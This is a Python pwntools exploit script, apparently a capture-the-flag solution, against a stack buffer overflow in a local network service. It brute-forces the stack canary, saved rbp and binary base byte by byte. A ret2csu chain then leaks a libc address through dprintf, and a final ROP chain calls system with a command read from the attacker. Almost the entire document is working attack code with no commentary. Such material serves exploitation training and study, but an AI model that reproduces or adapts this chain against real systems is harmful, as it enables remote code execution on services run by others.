from pwn import *

context.log_level = 'warning'

bin = ELF("./server")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Brute forcing canary
canary = ""
for j in range(len(canary), 8):
    for i in range(256):
        try:
            conn = remote("localhost", 1234)
            payload = "a"*0x2008 + canary + chr(i)
            conn.recvuntil("insert your data")
            conn.send(payload)
            conn.recvuntil("We received")
            conn.recvuntil("data saved")
            canary += chr(i)
            log.warning("Canary: " + str(j) + " - " + canary.encode('hex'))
            break
        except:
            conn.close()
            pass

# Brute force rbp
rbp = ""
for j in range(len(rbp), 8):
    for i in range(256):
        try:
            conn = remote("localhost", 1234)
            payload = "a"*0x2008 + canary + rbp + chr(i)
            conn.recvuntil("insert your data")
            conn.send(payload)
            conn.recvuntil("We received")
            conn.recvuntil("data saved")
            rbp += chr(i)
            log.warning("RBP: " + str(j) + " - " + rbp.encode('hex'))
            break
        except:
            conn.close()
            pass

# Brute force binary address
bin_addr = "\x15"
for j in range(len(bin_addr), 8):
    for i in range(256):
        try:
            conn = remote("localhost", 1234)
            payload = "a"*0x2008 + canary + rbp + bin_addr + chr(i)
            conn.recvuntil("insert your data")
            conn.send(payload)
            conn.recvuntil("We received")
            conn.recvline(timeout=0.5)
            if "data saved" in conn.recvline(timeout=0.5):
                bin_addr += chr(i)
                log.warning("Bin address: " + str(j) + \
                            " - " + bin_addr.encode('hex'))
                break
        except:
            conn.close()
            pass

# Leaking libc
conn = remote("localhost", 1234)

bin.address = u64(bin_addr) - 0xe15

"""
 ec6:   48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]
 ecb:   48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]
 ed0:   4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]
 ed5:   4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]
 eda:   4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]
 edf:   4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]
 ee4:   48 83 c4 38             add    rsp,0x38
 ee8:   c3                      ret
"""
payload = "a"*0x2008 + canary + rbp + \
          p64(bin.address + 0xec6) + \
          p64(0) + \
          p64(0) + \
          p64(0) + \
          p64(bin.got['dprintf']) + \
          p64(0) + \
          p64(bin.got['read']) + \
          p64(4)

"""
 eb0:   4c 89 ea                mov    rdx,r13
 eb3:   4c 89 f6                mov    rsi,r14
 eb6:   44 89 ff                mov    edi,r15d
 eb9:   41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
"""
payload += p64(bin.address + 0xeb0)

conn.recvuntil("insert your data")
conn.send(payload)
conn.recvuntil("thanks.\n")

libc_leak = u64(conn.recvn(6) + "\x00\x00")
conn.close()

log.warning("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.symbols['read']

conn = remote("localhost", 1234)

bin_sh_addr = next(libc.search("/bin/sh"))

"""
0x0000000000021102 : pop rdi ; ret
"""
pop_rdi_gadget = libc.address + 0x21102

"""
0x00000000001150c9 : pop rdx ; pop rsi ; ret
"""
pop_rdx_rsi_gadget = libc.address + 0x1150c9

payload = "a"*0x2008 + canary + rbp + \
          p64(pop_rdi_gadget) + \
          p64(4) + \
          p64(pop_rdx_rsi_gadget) + \
          p64(0x20) + \
          p64(bin.address + 0x2020D0) + \
          p64(libc.symbols['read']) + \
          p64(pop_rdi_gadget) + \
          p64(bin.address + 0x2020D0) + \
          p64(libc.symbols['system'])

conn.recvuntil("insert your data")
conn.send(payload)
conn.recvuntil("thanks.")

conn.sendline("touch pwned\x00")

conn.close()
